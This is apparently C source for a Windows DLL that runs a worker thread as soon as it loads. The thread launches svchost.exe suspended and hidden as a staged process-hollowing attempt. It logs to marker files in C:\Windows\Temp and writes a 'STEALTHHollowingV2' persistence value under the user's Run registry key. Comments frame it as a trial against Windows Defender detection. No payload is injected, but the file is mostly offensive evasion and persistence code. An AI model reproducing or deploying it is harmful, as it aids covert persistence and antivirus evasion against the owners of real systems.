#include <windows.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")

DWORD WINAPI HollowWorkerThread(LPVOID param) {
    // Attempt to create suspended process with renamed/benign target
    // Use svchost.exe as target (high-value benign process)
    // NOTE: May still be blocked by WD behavioral detection
    
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    
    si.cb = sizeof(si);
    
    FILE* f = fopen("C:\\Windows\\Temp\\injector_hollowing_v2_log.txt", "w");
    if (f) {
        fprintf(f, "[HOLLOW-V2] Attempting process hollowing with benign target...\n");
        fprintf(f, "[HOLLOW-V2] Target: svchost.exe (benign system process)\n");
        fclose(f);
    }
    
    // Attempt 1: Try with actual system process path
    BOOL bCreated = CreateProcessA(
        NULL,
        "C:\\Windows\\System32\\svchost.exe -k netsvcs",
        NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    
    if (bCreated) {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_hollowing_v2_executed.txt", "w");
        if (f) {
            fprintf(f, "INJECTOR_HOLLOWING_V2 EXECUTED\n");
            fprintf(f, "Timestamp: %ld\n", (long)time(NULL));
            fprintf(f, "Method: CreateProcessA (Suspended) with benign target\n");
            fprintf(f, "Target: svchost.exe\n");
            fprintf(f, "PID: %lu\n", pi.dwProcessId);
            fprintf(f, "Status: Process created in suspended state\n");
            fprintf(f, "WD Status: UNKNOWN (process hollowing may be blocked)\n");
            fclose(f);
        }
        
        // Even if payload injection blocked, we proved process was created
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "STEALTHHollowingV2", 0, REG_SZ, (const BYTE*)"Suspended", 10);
            RegCloseKey(hKey);
        }
        
        // Clean up
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        FILE* f2 = fopen("C:\\Windows\\Temp\\injector_hollowing_v2_log.txt", "a");
        if (f2) {
            fprintf(f2, "[HOLLOW-V2] Process created and terminated successfully\n");
            fclose(f2);
        }
    } else {
        FILE* f = fopen("C:\\Windows\\Temp\\injector_hollowing_v2_log.txt", "a");
        if (f) {
            fprintf(f, "[HOLLOW-V2] CreateProcessA BLOCKED by WD (expected)\n");
            fprintf(f, "[HOLLOW-V2] GetLastError: %lu\n", GetLastError());
            fclose(f);
        }
    }
    
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        HANDLE hThread = CreateThread(NULL, 0, HollowWorkerThread, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
        }
    }
    return TRUE;
}
